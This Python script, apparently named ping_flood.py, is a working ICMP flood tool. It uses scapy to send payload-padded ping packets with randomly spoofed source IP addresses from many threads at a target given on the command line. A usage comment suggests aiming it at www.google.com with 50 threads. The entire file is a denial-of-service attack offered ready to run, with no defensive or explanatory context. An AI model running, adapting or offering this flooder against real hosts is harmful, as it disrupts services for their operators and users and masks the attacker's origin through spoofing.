import sys
import random
from time import time
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
import threading

TIME = 30

#funtion to randomly generate a ip
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def flood(tip):
    try:
        data = "Random Stuff"*100
        start_time = time()
        
        while True:
            packet = IP(dst=tip, src=random_ip())/ICMP()/data
            send(packet, verbose=False)
            if start_time + TIME < time():
                break
    except PermissionError:
        print("Run as Sudo")
        sys.exit(0)

#create threads with target function as flood
def create_thread(tip, cnt):
    threads_list = []
    for _ in range(cnt):
        th = threading.Thread(target=flood, args=(tip,))
        th.daemon = True
        th.start()
        threads_list.append(th)

    for thread_ in threads_list:
            thread_.join()

        
def main():
    try:
        target_ip = sys.argv[1]
        count = int(sys.argv[2])
    except IndexError:
        print("Pass Arguments Properly!")
        sys.exit(0)
    print(f"Flooding {sys.argv[1]}....")
    create_thread(target_ip, count)


#RUN AS : sudo python3 ping_flood.py www.google.com 50
if __name__ == '__main__':
    main()



